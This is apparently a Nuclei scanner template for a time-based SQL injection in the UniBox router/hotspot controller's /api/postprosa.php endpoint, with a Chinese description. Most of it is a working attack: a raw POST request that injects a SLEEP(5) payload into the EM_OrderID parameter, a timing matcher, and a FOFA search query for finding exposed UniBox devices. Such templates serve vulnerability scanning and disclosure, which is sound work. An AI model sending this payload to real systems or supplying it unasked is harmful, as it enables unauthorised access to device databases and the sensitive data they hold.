id: unibox-postprosa-sqli
info:
  name: unibox路由器postprosa接口存在SQL注入
  author: leadlife
  severity: high
  description: UniBox 是一款一体化网络/热点控制器，可以部署为管理公共 WiFi 热点的热点网关，也可以部署为办公室和企业的网络控制器。unibox路由器postprosa存在SQL注入漏洞，攻击者可以根据该漏洞获取数据库权限，查看大量敏感信息。
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/2668b8cec9d13c85910a1df09359d3bdcee6bab7/wpoc/unibox%E8%B7%AF%E7%94%B1%E5%99%A8/unibox%E8%B7%AF%E7%94%B1%E5%99%A8postprosa%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="Unibox" && body="Controller"
    tips:
    repair:
    sqlmap:
    version:
  tags: sqli,unibox,time,sleep

http:
  - raw:  
      - |
        @timeout: 15s
        POST /api/postprosa.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
        Connection: close

        EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(5)))sdgB)+AND+'rBTA'%3d'rBTA

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
        condition: and